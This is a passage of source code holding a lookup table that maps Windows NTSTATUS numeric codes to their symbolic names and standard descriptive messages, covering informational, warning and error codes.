		0x40000004: ("STATUS_RXACT_STATE_CREATED","This informational level status indicates that a specified registry subtree transaction state did not yet exist and had to be created."),
		0x40000005: ("STATUS_SEGMENT_NOTIFICATION","{Segment Load} A virtual DOS machine (VDM) is loading, unloading, or moving an MS-DOS or Win16 program segment image. An exception is raised so that a debugger can load, unload, or track symbols and breakpoints within these 16-bit segments."),
		0x40000006: ("STATUS_LOCAL_USER_SESSION_KEY","{Local Session Key} A user session key was requested for a local remote procedure call (RPC) connection. The session key that is returned is a constant value and not unique to this connection."),
		0x40000007: ("STATUS_BAD_CURRENT_DIRECTORY","{Invalid Current Directory} The process cannot switch to the startup current directory %hs. Select OK to set the current directory to %hs, or select CANCEL to exit."),
		0x40000008: ("STATUS_SERIAL_MORE_WRITES","{Serial IOCTL Complete} A serial I/O operation was completed by another write to a serial port. (The IOCTL_SERIAL_XOFF_COUNTER reached zero.)"),
		0x40000009: ("STATUS_REGISTRY_RECOVERED","{Registry Recovery} One of the files that contains the system registry data had to be recovered by using a log or alternate copy. The recovery was successful."),
		0x4000000A: ("STATUS_FT_READ_RECOVERY_FROM_BACKUP","{Redundant Read} To satisfy a read request, the Windows NT fault-tolerant file system successfully read the requested data from a redundant copy. This was done because the file system encountered a failure on a member of the fault-tolerant volume but was unable to reassign the failing area of the device."),
		0x4000000B: ("STATUS_FT_WRITE_RECOVERY","{Redundant Write} To satisfy a write request, the Windows NT fault-tolerant file system successfully wrote a redundant copy of the information. This was done because the file system encountered a failure on a member of the fault-tolerant volume but was unable to reassign the failing area of the device."),
		0x4000000C: ("STATUS_SERIAL_COUNTER_TIMEOUT","{Serial IOCTL Timeout} A serial I/O operation completed because the time-out period expired. (The IOCTL_SERIAL_XOFF_COUNTER had not reached zero.)"),
		0x4000000D: ("STATUS_NULL_LM_PASSWORD","{Password Too Complex} The Windows password is too complex to be converted to a LAN Manager password. The LAN Manager password that returned is a NULL string."),
		0x4000000E: ("STATUS_IMAGE_MACHINE_TYPE_MISMATCH","{Machine Type Mismatch} The image file %hs is valid but is for a machine type other than the current machine. Select OK to continue, or CANCEL to fail the DLL load."),
		0x4000000F: ("STATUS_RECEIVE_PARTIAL","{Partial Data Received} The network transport returned partial data to its client. The remaining data will be sent later."),
		0x40000010: ("STATUS_RECEIVE_EXPEDITED","{Expedited Data Received} The network transport returned data to its client that was marked as expedited by the remote system."),
		0x40000011: ("STATUS_RECEIVE_PARTIAL_EXPEDITED","{Partial Expedited Data Received} The network transport returned partial data to its client and this data was marked as expedited by the remote system. The remaining data will be sent later."),
		0x40000012: ("STATUS_EVENT_DONE","{TDI Event Done} The TDI indication has completed successfully."),
		0x40000013: ("STATUS_EVENT_PENDING","{TDI Event Pending} The TDI indication has entered the pending state."),
		0x40000014: ("STATUS_CHECKING_FILE_SYSTEM","Checking file system on %wZ."),
		0x40000015: ("STATUS_FATAL_APP_EXIT","{Fatal Application Exit} %hs"),
		0x40000016: ("STATUS_PREDEFINED_HANDLE","The specified registry key is referenced by a predefined handle."),
		0x40000017: ("STATUS_WAS_UNLOCKED","{Page Unlocked} The page protection of a locked page was changed to 'No Access' and the page was unlocked from memory and from the process."),
		0x40000018: ("STATUS_SERVICE_NOTIFICATION","%hs"),
		0x40000019: ("STATUS_WAS_LOCKED","{Page Locked} One of the pages to lock was already locked."),
		0x4000001A: ("STATUS_LOG_HARD_ERROR","Application popup: %1 : %2"),
		0x4000001B: ("STATUS_ALREADY_WIN32","A Win32 process already exists."),
		0x4000001C: ("STATUS_WX86_UNSIMULATE","An exception status code that is used by the Win32 x86 emulation subsystem."),
		0x4000001D: ("STATUS_WX86_CONTINUE","An exception status code that is used by the Win32 x86 emulation subsystem."),
		0x4000001E: ("STATUS_WX86_SINGLE_STEP","An exception status code that is used by the Win32 x86 emulation subsystem."),
		0x4000001F: ("STATUS_WX86_BREAKPOINT","An exception status code that is used by the Win32 x86 emulation subsystem."),
		0x40000020: ("STATUS_WX86_EXCEPTION_CONTINUE","An exception status code that is used by the Win32 x86 emulation subsystem."),
		0x40000021: ("STATUS_WX86_EXCEPTION_LASTCHANCE","An exception status code that is used by the Win32 x86 emulation subsystem."),
		0x40000022: ("STATUS_WX86_EXCEPTION_CHAIN","An exception status code that is used by the Win32 x86 emulation subsystem."),
		0x40000023: ("STATUS_IMAGE_MACHINE_TYPE_MISMATCH_EXE","{Machine Type Mismatch} The image file %hs is valid but is for a machine type other than the current machine."),
		0x40000024: ("STATUS_NO_YIELD_PERFORMED","A yield execution was performed and no thread was available to run."),
		0x40000025: ("STATUS_TIMER_RESUME_IGNORED","The resume flag to a timer API was ignored."),
		0x40000026: ("STATUS_ARBITRATION_UNHANDLED","The arbiter has deferred arbitration of these resources to its parent."),
		0x40000027: ("STATUS_CARDBUS_NOT_SUPPORTED","The device has detected a CardBus card in its slot."),
		0x40000028: ("STATUS_WX86_CREATEWX86TIB","An exception status code that is used by the Win32 x86 emulation subsystem."),
		0x40000029: ("STATUS_MP_PROCESSOR_MISMATCH","The CPUs in this multiprocessor system are not all the same revision level. To use all processors, the operating system restricts itself to the features of the least capable processor in the system. If problems occur with this system, contact the CPU manufacturer to see if this mix of processors is supported."),
		0x4000002A: ("STATUS_HIBERNATED","The system was put into hibernation."),
		0x4000002B: ("STATUS_RESUME_HIBERNATION","The system was resumed from hibernation."),
		0x4000002C: ("STATUS_FIRMWARE_UPDATED","Windows has detected that the system firmware (BIOS) was updated [previous firmware date = %2, current firmware date %3]."),
		0x4000002D: ("STATUS_DRIVERS_LEAKING_LOCKED_PAGES","A device driver is leaking locked I/O pages and is causing system degradation. The system has automatically enabled the tracking code to try and catch the culprit."),
		0x4000002E: ("STATUS_MESSAGE_RETRIEVED","The ALPC message being canceled has already been retrieved from the queue on the other side."),
		0x4000002F: ("STATUS_SYSTEM_POWERSTATE_TRANSITION","The system power state is transitioning from %2 to %3."),
		0x40000030: ("STATUS_ALPC_CHECK_COMPLETION_LIST","The receive operation was successful. Check the ALPC completion list for the received message."),
		0x40000031: ("STATUS_SYSTEM_POWERSTATE_COMPLEX_TRANSITION","The system power state is transitioning from %2 to %3 but could enter %4."),
		0x40000032: ("STATUS_ACCESS_AUDIT_BY_POLICY","Access to %1 is monitored by policy rule %2."),
		0x40000033: ("STATUS_ABANDON_HIBERFILE","A valid hibernation file has been invalidated and should be abandoned."),
		0x40000034: ("STATUS_BIZRULES_NOT_ENABLED","Business rule scripts are disabled for the calling application."),
		0x40000294: ("STATUS_WAKE_SYSTEM","The system has awoken."),
		0x40000370: ("STATUS_DS_SHUTTING_DOWN","The directory service is shutting down."),
		0x40010001: ("DBG_REPLY_LATER","Debugger will reply later."),
		0x40010002: ("DBG_UNABLE_TO_PROVIDE_HANDLE","Debugger cannot provide a handle."),
		0x40010003: ("DBG_TERMINATE_THREAD","Debugger terminated the thread."),
		0x40010004: ("DBG_TERMINATE_PROCESS","Debugger terminated the process."),
		0x40010005: ("DBG_CONTROL_C","Debugger obtained control of C."),
		0x40010006: ("DBG_PRINTEXCEPTION_C","Debugger printed an exception on control C."),
		0x40010007: ("DBG_RIPEXCEPTION","Debugger received a RIP exception."),
		0x40010008: ("DBG_CONTROL_BREAK","Debugger received a control break."),
		0x40010009: ("DBG_COMMAND_EXCEPTION","Debugger command communication exception."),
		0x40020056: ("RPC_NT_UUID_LOCAL_ONLY","A UUID that is valid only on this computer has been allocated."),
		0x400200AF: ("RPC_NT_SEND_INCOMPLETE","Some data remains to be sent in the request buffer."),
		0x400A0004: ("STATUS_CTX_CDM_CONNECT","The Client Drive Mapping Service has connected on Terminal Connection."),
		0x400A0005: ("STATUS_CTX_CDM_DISCONNECT","The Client Drive Mapping Service has disconnected on Terminal Connection."),
		0x4015000D: ("STATUS_SXS_RELEASE_ACTIVATION_CONTEXT","A kernel mode component is releasing a reference on an activation context."),
		0x40190034: ("STATUS_RECOVERY_NOT_NEEDED","The transactional resource manager is already consistent. Recovery is not needed."),
		0x40190035: ("STATUS_RM_ALREADY_STARTED","The transactional resource manager has already been started."),
		0x401A000C: ("STATUS_LOG_NO_RESTART","The log service encountered a log stream with no restart area."),
		0x401B00EC: ("STATUS_VIDEO_DRIVER_DEBUG_REPORT_REQUEST","{Display Driver Recovered From Failure} The %hs display driver has detected a failure and recovered from it. Some graphical operations may have failed. The next time you restart the machine, a dialog box appears, giving you an opportunity to upload data about this failure to Microsoft."),
		0x401E000A: ("STATUS_GRAPHICS_PARTIAL_DATA_POPULATED","The specified buffer is not big enough to contain the entire requested dataset. Partial data is populated up to the size of the buffer. The caller needs to provide a buffer of the size as specified in the partially populated buffer's content (interface specific)."),
		0x401E0117: ("STATUS_GRAPHICS_DRIVER_MISMATCH","The kernel driver detected a version mismatch between it and the user mode driver."),
		0x401E0307: ("STATUS_GRAPHICS_MODE_NOT_PINNED","No mode is pinned on the specified VidPN source/target."),
		0x401E031E: ("STATUS_GRAPHICS_NO_PREFERRED_MODE","The specified mode set does not specify a preference for one of its modes."),
		0x401E034B: ("STATUS_GRAPHICS_DATASET_IS_EMPTY","The specified dataset (for example, mode set, frequency range set, descriptor set, or topology) is empty."),
		0x401E034C: ("STATUS_GRAPHICS_NO_MORE_ELEMENTS_IN_DATASET","The specified dataset (for example, mode set, frequency range set, descriptor set, or topology) does not contain any more elements."),
		0x401E0351: ("STATUS_GRAPHICS_PATH_CONTENT_GEOMETRY_TRANSFORMATION_NOT_PINNED","The specified content transformation is not pinned on the specified VidPN present path."),
		0x401E042F: ("STATUS_GRAPHICS_UNKNOWN_CHILD_STATUS","The child device presence was not reliably detected."),
		0x401E0437: ("STATUS_GRAPHICS_LEADLINK_START_DEFERRED","Starting the lead adapter in a linked configuration has been temporarily deferred."),
		0x401E0439: ("STATUS_GRAPHICS_POLLING_TOO_FREQUENTLY","The display adapter is being polled for children too frequently at the same polling level."),
		0x401E043A: ("STATUS_GRAPHICS_START_DEFERRED","Starting the adapter has been temporarily deferred."),
		0x40230001: ("STATUS_NDIS_INDICATION_REQUIRED","The request will be completed later by an NDIS status indication."),
		0x80000001: ("STATUS_GUARD_PAGE_VIOLATION","{EXCEPTION} Guard Page Exception A page of memory that marks the end of a data structure, such as a stack or an array, has been accessed."),
		0x80000002: ("STATUS_DATATYPE_MISALIGNMENT","{EXCEPTION} Alignment Fault A data type misalignment was detected in a load or store instruction."),
		0x80000003: ("STATUS_BREAKPOINT","{EXCEPTION} Breakpoint A breakpoint has been reached."),
		0x80000004: ("STATUS_SINGLE_STEP","{EXCEPTION} Single Step A single step or trace operation has just been completed."),
		0x80000005: ("STATUS_BUFFER_OVERFLOW","{Buffer Overflow} The data was too large to fit into the specified buffer."),
		0x80000006: ("STATUS_NO_MORE_FILES","{No More Files} No more files were found which match the file specification."),
		0x80000007: ("STATUS_WAKE_SYSTEM_DEBUGGER","{Kernel Debugger Awakened} The system debugger was awakened by an interrupt."),
		0x8000000A: ("STATUS_HANDLES_CLOSED","{Handles Closed} Handles to objects have been automatically closed because of the requested operation."),
		0x8000000B: ("STATUS_NO_INHERITANCE","{Non-Inheritable ACL} An access control list (ACL) contains no components that can be inherited."),
		0x8000000C: ("STATUS_GUID_SUBSTITUTION_MADE","{GUID Substitution} During the translation of a globally unique identifier (GUID) to a Windows security ID (SID), no administratively defined GUID prefix was found. A substitute prefix was used, which will not compromise system security. However, this may provide a more restrictive access than intended."),
		0x8000000D: ("STATUS_PARTIAL_COPY","Because of protection conflicts, not all the requested bytes could be copied."),
		0x8000000E: ("STATUS_DEVICE_PAPER_EMPTY","{Out of Paper} The printer is out of paper."),
		0x8000000F: ("STATUS_DEVICE_POWERED_OFF","{Device Power Is Off} The printer power has been turned off."),
		0x80000010: ("STATUS_DEVICE_OFF_LINE","{Device Offline} The printer has been taken offline."),
		0x80000011: ("STATUS_DEVICE_BUSY","{Device Busy} The device is currently busy."),
		0x80000012: ("STATUS_NO_MORE_EAS","{No More EAs} No more extended attributes (EAs) were found for the file."),
		0x80000013: ("STATUS_INVALID_EA_NAME","{Illegal EA} The specified extended attribute (EA) name contains at least one illegal character."),
		0x80000014: ("STATUS_EA_LIST_INCONSISTENT","{Inconsistent EA List} The extended attribute (EA) list is inconsistent."),
		0x80000015: ("STATUS_INVALID_EA_FLAG","{Invalid EA Flag} An invalid extended attribute (EA) flag was set."),
		0x80000016: ("STATUS_VERIFY_REQUIRED","{Verifying Disk} The media has changed and a verify operation is in progress; therefore, no reads or writes may be performed to the device, except those that are used in the verify operation."),
		0x80000017: ("STATUS_EXTRANEOUS_INFORMATION","{Too Much Information} The specified access control list (ACL) contained more information than was expected."),
		0x80000018: ("STATUS_RXACT_COMMIT_NECESSARY","This warning level status indicates that the transaction state already exists for the registry subtree, but that a transaction commit was previously aborted. The commit has NOT been completed but has not been rolled back either; therefore, it may still be committed, if needed."),
		0x8000001A: ("STATUS_NO_MORE_ENTRIES","{No More Entries} No more entries are available from an enumeration operation."),
		0x8000001B: ("STATUS_FILEMARK_DETECTED","{Filemark Found} A filemark was detected."),
		0x8000001C: ("STATUS_MEDIA_CHANGED","{Media Changed} The media may have changed."),
		0x8000001D: ("STATUS_BUS_RESET","{I/O Bus Reset} An I/O bus reset was detected."),
		0x8000001E: ("STATUS_END_OF_MEDIA","{End of Media} The end of the media was encountered."),
		0x8000001F: ("STATUS_BEGINNING_OF_MEDIA","The beginning of a tape or partition has been detected."),
		0x80000020: ("STATUS_MEDIA_CHECK","{Media Changed} The media may have changed."),
		0x80000021: ("STATUS_SETMARK_DETECTED","A tape access reached a set mark."),
		0x80000022: ("STATUS_NO_DATA_DETECTED","During a tape access, the end of the data written is reached."),
		0x80000023: ("STATUS_REDIRECTOR_HAS_OPEN_HANDLES","The redirector is in use and cannot be unloaded."),
		0x80000024: ("STATUS_SERVER_HAS_OPEN_HANDLES","The server is in use and cannot be unloaded."),
		0x80000025: ("STATUS_ALREADY_DISCONNECTED","The specified connection has already been disconnected."),
		0x80000026: ("STATUS_LONGJUMP","A long jump has been executed."),
		0x80000027: ("STATUS_CLEANER_CARTRIDGE_INSTALLED","A cleaner cartridge is present in the tape library."),
		0x80000028: ("STATUS_PLUGPLAY_QUERY_VETOED","The Plug and Play query operation was not successful."),
		0x80000029: ("STATUS_UNWIND_CONSOLIDATE","A frame consolidation has been executed."),
		0x8000002A: ("STATUS_REGISTRY_HIVE_RECOVERED","{Registry Hive Recovered} The registry hive (file): %hs was corrupted and it has been recovered. Some data might have been lost."),
		0x8000002B: ("STATUS_DLL_MIGHT_BE_INSECURE","The application is attempting to run executable code from the module %hs. This may be insecure. An alternative, %hs, is available. Should the application use the secure module %hs?"),
		0x8000002C: ("STATUS_DLL_MIGHT_BE_INCOMPATIBLE","The application is loading executable code from the module %hs. This is secure but may be incompatible with previous releases of the operating system. An alternative, %hs, is available. Should the application use the secure module %hs?"),
		0x8000002D: ("STATUS_STOPPED_ON_SYMLINK","The create operation stopped after reaching a symbolic link."),
		0x80000288: ("STATUS_DEVICE_REQUIRES_CLEANING","The device has indicated that cleaning is necessary."),
		0x80000289: ("STATUS_DEVICE_DOOR_OPEN","The device has indicated that its door is open. Further operations require it closed and secured."),
		0x80000803: ("STATUS_DATA_LOST_REPAIR","Windows discovered a corruption in the file %hs. This file has now been repaired. Check if any data in the file was lost because of the corruption."),
		0x80010001: ("DBG_EXCEPTION_NOT_HANDLED","Debugger did not handle the exception."),
		0x80130001: ("STATUS_CLUSTER_NODE_ALREADY_UP","The cluster node is already up."),
		0x80130002: ("STATUS_CLUSTER_NODE_ALREADY_DOWN","The cluster node is already down."),
		0x80130003: ("STATUS_CLUSTER_NETWORK_ALREADY_ONLINE","The cluster network is already online."),
		0x80130004: ("STATUS_CLUSTER_NETWORK_ALREADY_OFFLINE","The cluster network is already offline."),
		0x80130005: ("STATUS_CLUSTER_NODE_ALREADY_MEMBER","The cluster node is already a member of the cluster."),
		0x80190009: ("STATUS_COULD_NOT_RESIZE_LOG","The log could not be set to the requested size."),
		0x80190029: ("STATUS_NO_TXF_METADATA","There is no transaction metadata on the file."),
		0x80190031: ("STATUS_CANT_RECOVER_WITH_HANDLE_OPEN","The file cannot be recovered because there is a handle still open on it."),
		0x80190041: ("STATUS_TXF_METADATA_ALREADY_PRESENT","Transaction metadata is already present on this file and cannot be superseded."),
		0x80190042: ("STATUS_TRANSACTION_SCOPE_CALLBACKS_NOT_SET","A transaction scope could not be entered because the scope handler has not been initialized."),
		0x801B00EB: ("STATUS_VIDEO_HUNG_DISPLAY_DRIVER_THREAD_RECOVERED","{Display Driver Stopped Responding and recovered} The %hs display driver has stopped working normally. The recovery had been performed."),
		0x801C0001: ("STATUS_FLT_BUFFER_TOO_SMALL","{Buffer too small} The buffer is too small to contain the entry. No information has been written to the buffer."),
		0x80210001: ("STATUS_FVE_PARTIAL_METADATA","Volume metadata read or write is incomplete."),
		0x80210002: ("STATUS_FVE_TRANSIENT_STATE","BitLocker encryption keys were ignored because the volume was in a transient state."),
		0xC0000001: ("STATUS_UNSUCCESSFUL","{Operation Failed} The requested operation was unsuccessful."),
		0xC0000002: ("STATUS_NOT_IMPLEMENTED","{Not Implemented} The requested operation is not implemented."),
		0xC0000003: ("STATUS_INVALID_INFO_CLASS","{Invalid Parameter} The specified information class is not a valid information class for the specified object."),
		0xC0000004: ("STATUS_INFO_LENGTH_MISMATCH","The specified information record length does not match the length that is required for the specified information class."),
		0xC0000005: ("STATUS_ACCESS_VIOLATION","The instruction at 0x%08lx referenced memory at 0x%08lx. The memory could not be %s."),
		0xC0000006: ("STATUS_IN_PAGE_ERROR","The instruction at 0x%08lx referenced memory at 0x%08lx. The required data was not placed into memory because of an I/O error status of 0x%08lx."),
		0xC0000007: ("STATUS_PAGEFILE_QUOTA","The page file quota for the process has been exhausted."),
		0xC0000008: ("STATUS_INVALID_HANDLE","An invalid HANDLE was specified."),
		0xC0000009: ("STATUS_BAD_INITIAL_STACK","An invalid initial stack was specified in a call to NtCreateThread."),
		0xC000000A: ("STATUS_BAD_INITIAL_PC","An invalid initial start address was specified in a call to NtCreateThread."),
		0xC000000B: ("STATUS_INVALID_CID","An invalid client ID was specified."),
		0xC000000C: ("STATUS_TIMER_NOT_CANCELED","An attempt was made to cancel or set a timer that has an associated APC and the specified thread is not the thread that originally set the timer with an associated APC routine."),
		0xC000000D: ("STATUS_INVALID_PARAMETER","An invalid parameter was passed to a service or function."),
		0xC000000E: ("STATUS_NO_SUCH_DEVICE","A device that does not exist was specified."),
		0xC000000F: ("STATUS_NO_SUCH_FILE","{File Not Found} The file %hs does not exist."),
		0xC0000010: ("STATUS_INVALID_DEVICE_REQUEST","The specified request is not a valid operation for the target device."),
		0xC0000011: ("STATUS_END_OF_FILE","The end-of-file marker has been reached. There is no valid data in the file beyond this marker."),
		0xC0000012: ("STATUS_WRONG_VOLUME","{Wrong Volume} The wrong volume is in the drive. Insert volume %hs into drive %hs."),
		0xC0000013: ("STATUS_NO_MEDIA_IN_DEVICE","{No Disk} There is no disk in the drive. Insert a disk into drive %hs."),
		0xC0000014: ("STATUS_UNRECOGNIZED_MEDIA","{Unknown Disk Format} The disk in drive %hs is not formatted properly. Check the disk, and reformat it, if needed."),
		0xC0000015: ("STATUS_NONEXISTENT_SECTOR","{Sector Not Found} The specified sector does not exist."),
		0xC0000016: ("STATUS_MORE_PROCESSING_REQUIRED","{Still Busy} The specified I/O request packet (IRP) cannot be disposed of because the I/O operation is not complete."),
		0xC0000017: ("STATUS_NO_MEMORY","{Not Enough Quota} Not enough virtual memory or paging file quota is available to complete the specified operation."),
		0xC0000018: ("STATUS_CONFLICTING_ADDRESSES","{Conflicting Address Range} The specified address range conflicts with the address space."),
		0xC0000019: ("STATUS_NOT_MAPPED_VIEW","The address range to unmap is not a mapped view."),
		0xC000001A: ("STATUS_UNABLE_TO_FREE_VM","The virtual memory cannot be freed."),
		0xC000001B: ("STATUS_UNABLE_TO_DELETE_SECTION","The specified section cannot be deleted."),
		0xC000001C: ("STATUS_INVALID_SYSTEM_SERVICE","An invalid system service was specified in a system service call."),
		0xC000001D: ("STATUS_ILLEGAL_INSTRUCTION","{EXCEPTION} Illegal Instruction An attempt was made to execute an illegal instruction."),
		0xC000001E: ("STATUS_INVALID_LOCK_SEQUENCE","{Invalid Lock Sequence} An attempt was made to execute an invalid lock sequence."),
		0xC000001F: ("STATUS_INVALID_VIEW_SIZE","{Invalid Mapping} An attempt was made to create a view for a section that is bigger than the section."),
		0xC0000020: ("STATUS_INVALID_FILE_FOR_SECTION","{Bad File} The attributes of the specified mapping file for a section of memory cannot be read."),
		0xC0000021: ("STATUS_ALREADY_COMMITTED","{Already Committed} The specified address range is already committed."),
		0xC0000022: ("STATUS_ACCESS_DENIED","{Access Denied} A process has requested access to an object but has not been granted those access rights."),
		0xC0000023: ("STATUS_BUFFER_TOO_SMALL","{Buffer Too Small} The buffer is too small to contain the entry. No information has been written to the buffer."),
		0xC0000024: ("STATUS_OBJECT_TYPE_MISMATCH","{Wrong Type} There is a mismatch between the type of object that is required by the requested operation and the type of object that is specified in the request."),
		0xC0000025: ("STATUS_NONCONTINUABLE_EXCEPTION","{EXCEPTION} Cannot Continue Windows cannot continue from this exception."),
		0xC0000026: ("STATUS_INVALID_DISPOSITION","An invalid exception disposition was returned by an exception handler."),
		0xC0000027: ("STATUS_UNWIND","Unwind exception code."),
		0xC0000028: ("STATUS_BAD_STACK","An invalid or unaligned stack was encountered during an unwind operation."),
		0xC0000029: ("STATUS_INVALID_UNWIND_TARGET","An invalid unwind target was encountered during an unwind operation."),
		0xC000002A: ("STATUS_NOT_LOCKED","An attempt was made to unlock a page of memory that was not locked."),
		0xC000002B: ("STATUS_PARITY_ERROR","A device parity error on an I/O operation."),
		0xC000002C: ("STATUS_UNABLE_TO_DECOMMIT_VM","An attempt was made to decommit uncommitted virtual memory."),
		0xC000002D: ("STATUS_NOT_COMMITTED","An attempt was made to change the attributes on memory that has not been committed."),
		0xC000002E: ("STATUS_INVALID_PORT_ATTRIBUTES","Invalid object attributes specified to NtCreatePort or invalid port attributes specified to NtConnectPort."),
		0xC000002F: ("STATUS_PORT_MESSAGE_TOO_LONG","The length of the message that was passed to NtRequestPort or NtRequestWaitReplyPort is longer than the maximum message that is allowed by the port."),
		0xC0000030: ("STATUS_INVALID_PARAMETER_MIX","An invalid combination of parameters was specified."),
		0xC0000031: ("STATUS_INVALID_QUOTA_LOWER","An attempt was made to lower a quota limit below the current usage."),
		0xC0000032: ("STATUS_DISK_CORRUPT_ERROR","{Corrupt Disk} The file system structure on the disk is corrupt and unusable. Run the Chkdsk utility on the volume %hs."),
		0xC0000033: ("STATUS_OBJECT_NAME_INVALID","The object name is invalid."),
		0xC0000034: ("STATUS_OBJECT_NAME_NOT_FOUND","The object name is not found."),
		0xC0000035: ("STATUS_OBJECT_NAME_COLLISION","The object name already exists."),
		0xC0000037: ("STATUS_PORT_DISCONNECTED","An attempt was made to send a message to a disconnected communication port."),
		0xC0000038: ("STATUS_DEVICE_ALREADY_ATTACHED","An attempt was made to attach to a device that was already attached to another device."),
		0xC0000039: ("STATUS_OBJECT_PATH_INVALID","The object path component was not a directory object."),
		0xC000003A: ("STATUS_OBJECT_PATH_NOT_FOUND","{Path Not Found} The path %hs does not exist."),
		0xC000003B: ("STATUS_OBJECT_PATH_SYNTAX_BAD","The object path component was not a directory object."),
		0xC000003C: ("STATUS_DATA_OVERRUN","{Data Overrun} A data overrun error occurred."),
		0xC000003D: ("STATUS_DATA_LATE_ERROR","{Data Late} A data late error occurred."),
		0xC000003E: ("STATUS_DATA_ERROR","{Data Error} An error occurred in reading or writing data."),
		0xC000003F: ("STATUS_CRC_ERROR","{Bad CRC} A cyclic redundancy check (CRC) checksum error occurred."),
		0xC0000040: ("STATUS_SECTION_TOO_BIG","{Section Too Large} The specified section is too big to map the file."),
		0xC0000041: ("STATUS_PORT_CONNECTION_REFUSED","The NtConnectPort request is refused."),
		0xC0000042: ("STATUS_INVALID_PORT_HANDLE","The type of port handle is invalid for the operation that is requested."),
		0xC0000043: ("STATUS_SHARING_VIOLATION","A file cannot be opened because the share access flags are incompatible."),
		0xC0000044: ("STATUS_QUOTA_EXCEEDED","Insufficient quota exists to complete the operation."),
		0xC0000045: ("STATUS_INVALID_PAGE_PROTECTION","The specified page protection was not valid."),
		0xC0000046: ("STATUS_MUTANT_NOT_OWNED","An attempt to release a mutant object was made by a thread that was not the owner of the mutant object."),
		0xC0000047: ("STATUS_SEMAPHORE_LIMIT_EXCEEDED","An attempt was made to release a semaphore such that its maximum count would have been exceeded."),
		0xC0000048: ("STATUS_PORT_ALREADY_SET","An attempt was made to set the DebugPort or ExceptionPort of a process, but a port already exists in the process, or an attempt was made to set the CompletionPort of a file but a port was already set in the file, or an attempt was made to set the associated completion port of an ALPC port but it is already set."),
		0xC0000049: ("STATUS_SECTION_NOT_IMAGE","An attempt was made to query image information on a section that does not map an image."),
		0xC000004A: ("STATUS_SUSPEND_COUNT_EXCEEDED","An attempt was made to suspend a thread whose suspend count was at its maximum."),
		0xC000004B: ("STATUS_THREAD_IS_TERMINATING","An attempt was made to suspend a thread that has begun termination."),
		0xC000004C: ("STATUS_BAD_WORKING_SET_LIMIT","An attempt was made to set the working set limit to an invalid value (for example, the minimum greater than maximum)."),
		0xC000004D: ("STATUS_INCOMPATIBLE_FILE_MAP","A section was created to map a file that is not compatible with an already existing section that maps the same file."),
		0xC000004E: ("STATUS_SECTION_PROTECTION","A view to a section specifies a protection that is incompatible with the protection of the initial view."),
		0xC000004F: ("STATUS_EAS_NOT_SUPPORTED","An operation involving EAs failed because the file system does not support EAs."),
		0xC0000050: ("STATUS_EA_TOO_LARGE","An EA operation failed because the EA set is too large."),
		0xC0000051: ("STATUS_NONEXISTENT_EA_ENTRY","An EA operation failed because the name or EA index is invalid."),
		0xC0000052: ("STATUS_NO_EAS_ON_FILE","The file for which EAs were requested has no EAs."),
		0xC0000053: ("STATUS_EA_CORRUPT_ERROR","The EA is corrupt and cannot be read."),
		0xC0000054: ("STATUS_FILE_LOCK_CONFLICT","A requested read/write cannot be granted due to a conflicting file lock."),
		0xC0000055: ("STATUS_LOCK_NOT_GRANTED","A requested file lock cannot be granted due to other existing locks."),
		0xC0000056: ("STATUS_DELETE_PENDING","A non-close operation has been requested of a file object that has a delete pending."),
		0xC0000057: ("STATUS_CTL_FILE_NOT_SUPPORTED","An attempt was made to set the control attribute on a file. This attribute is not supported in the destination file system."),
		0xC0000058: ("STATUS_UNKNOWN_REVISION","Indicates a revision number that was encountered or specified is not one that is known by the service. It may be a more recent revision than the service is aware of."),
		0xC0000059: ("STATUS_REVISION_MISMATCH","Indicates that two revision levels are incompatible."),
		0xC000005A: ("STATUS_INVALID_OWNER","Indicates a particular security ID may not be assigned as the owner of an object."),
		0xC000005B: ("STATUS_INVALID_PRIMARY_GROUP","Indicates a particular security ID may not be assigned as the primary group of an object."),
		0xC000005C: ("STATUS_NO_IMPERSONATION_TOKEN","An attempt has been made to operate on an impersonation token by a thread that is not currently impersonating a client."),
		0xC000005D: ("STATUS_CANT_DISABLE_MANDATORY","A mandatory group may not be disabled."),
		0xC000005E: ("STATUS_NO_LOGON_SERVERS","No logon servers are currently available to service the logon request."),
		0xC000005F: ("STATUS_NO_SUCH_LOGON_SESSION","A specified logon session does not exist. It may already have been terminated."),
		0xC0000060: ("STATUS_NO_SUCH_PRIVILEGE","A specified privilege does not exist."),
		0xC0000061: ("STATUS_PRIVILEGE_NOT_HELD","A required privilege is not held by the client."),
		0xC0000062: ("STATUS_INVALID_ACCOUNT_NAME","The name provided is not a properly formed account name."),
		0xC0000063: ("STATUS_USER_EXISTS","The specified account already exists."),
		0xC0000064: ("STATUS_NO_SUCH_USER","The specified account does not exist."),
		0xC0000065: ("STATUS_GROUP_EXISTS","The specified group already exists."),
		0xC0000066: ("STATUS_NO_SUCH_GROUP","The specified group does not exist."),
		0xC0000067: ("STATUS_MEMBER_IN_GROUP","The specified user account is already in the specified group account. Also used to indicate a group cannot be deleted because it contains a member."),
		0xC0000068: ("STATUS_MEMBER_NOT_IN_GROUP","The specified user account is not a member of the specified group account."),
		0xC0000069: ("STATUS_LAST_ADMIN","Indicates the requested operation would disable or delete the last remaining administration account. This is not allowed to prevent creating a situation in which the system cannot be administrated."),
		0xC000006A: ("STATUS_WRONG_PASSWORD","When trying to update a password, this return status indicates that the value provided as the current password is not correct."),
		0xC000006B: ("STATUS_ILL_FORMED_PASSWORD","When trying to update a password, this return status indicates that the value provided for the new password contains values that are not allowed in passwords."),
		0xC000006C: ("STATUS_PASSWORD_RESTRICTION","When trying to update a password, this status indicates that some password update rule has been violated. For example, the password may not meet length criteria."),
		0xC000006D: ("STATUS_LOGON_FAILURE","The attempted logon is invalid. This is either due to a bad username or authentication information."),
		0xC000006E: ("STATUS_ACCOUNT_RESTRICTION","Indicates a referenced user name and authentication information are valid, but some user account restriction has prevented successful authentication (such as time-of-day restrictions)."),
		0xC000006F: ("STATUS_INVALID_LOGON_HOURS","The user account has time restrictions and may not be logged onto at this time."),
		0xC0000070: ("STATUS_INVALID_WORKSTATION","The user account is restricted so that it may not be used to log on from the source workstation."),
		0xC0000071: ("STATUS_PASSWORD_EXPIRED","The user account password has expired."),
		0xC0000072: ("STATUS_ACCOUNT_DISABLED","The referenced account is currently disabled and may not be logged on to."),
		0xC0000073: ("STATUS_NONE_MAPPED","None of the information to be translated has been translated."),
		0xC0000074: ("STATUS_TOO_MANY_LUIDS_REQUESTED","The number of LUIDs requested may not be allocated with a single allocation."),
		0xC0000075: ("STATUS_LUIDS_EXHAUSTED","Indicates there are no more LUIDs to allocate."),
		0xC0000076: ("STATUS_INVALID_SUB_AUTHORITY","Indicates the sub-authority value is invalid for the particular use."),
